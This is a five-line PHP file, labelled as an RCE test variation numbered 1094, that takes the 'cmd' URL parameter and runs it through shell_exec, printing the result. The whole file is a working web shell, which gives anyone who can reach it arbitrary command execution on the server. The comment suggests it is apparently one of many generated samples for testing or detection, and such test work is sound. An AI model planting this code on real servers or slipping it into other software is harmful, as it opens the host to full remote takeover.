<?php
// RCE test variation #1094
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>